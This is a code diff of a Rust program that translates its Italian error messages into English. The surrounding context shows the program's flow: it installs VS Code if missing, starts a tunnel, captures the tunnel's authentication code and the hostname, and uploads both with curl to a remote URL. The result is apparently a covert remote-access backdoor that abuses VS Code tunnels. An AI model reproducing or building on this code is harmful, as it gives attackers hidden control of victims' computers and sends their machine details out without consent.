@@ -135,7 +135,7 @@ fn startunnel() -> Result<(String, std::process::Child), Box<dyn std::error::Err
     }
 
     if code.is_empty() {
-        return Err("Codice di autenticazione non trovato".into());
+        return Err("Unable to find auth code".into());
     }
     
     Ok((code, child))
@@ -158,8 +158,8 @@ fn sendata(url: &str, file_path: &str) -> Result<(), Box<dyn std::error::Error>>
         .wait_with_output()?;
     
     if !output.status.success() {
-        eprintln!("Errore curl: {}", String::from_utf8_lossy(&output.stderr));
-        return Err("Errore nell'invio dei dati con curl".into());
+        eprintln!("Curl error: {}", String::from_utf8_lossy(&output.stderr));
+        return Err("Unable to send data".into());
     }
 
     Ok(())
@@ -205,7 +205,7 @@ fn main() {
 
     if !isvscodeinstalled(){
         if let Err(e) = download(url){
-            eprintln!("Errore durante il download: {}", e);
+            eprintln!("Unable to download file: {}", e);
             return;
         }
     }
@@ -213,7 +213,7 @@ fn main() {
     match gethost(){
         Ok(hostname) => {
             if let Err(e) = infotofile(output_file, hostname){
-                eprintln!("Errore durante il salvataggio dell'hostname: {}", e);
+                eprintln!("Unable to save hostname: {}", e);
             }
         }
         Err(_) => {}
@@ -222,7 +222,7 @@ fn main() {
     let tunnel_handle = thread::spawn(move || {
         if let Ok((code, mut child)) = startunnel() {
             if let Err(e) = infotofile(output_file, code) {
-                eprintln!("Errore durante il salvataggio del codice: {}", e);
+                eprintln!("Unable to save OTP: {}", e);
             }
             
             // Mantain tunnel up and running
@@ -241,7 +241,7 @@ fn main() {
     std::thread::sleep(std::time::Duration::from_secs(2));
 
     if let Err(e) = sendata(upurl, output_file){
-        eprintln!("Errore durante l'invio dei dati: {}", e);
+        eprintln!("Unable to send data: {}", e);
         return;
     }
 
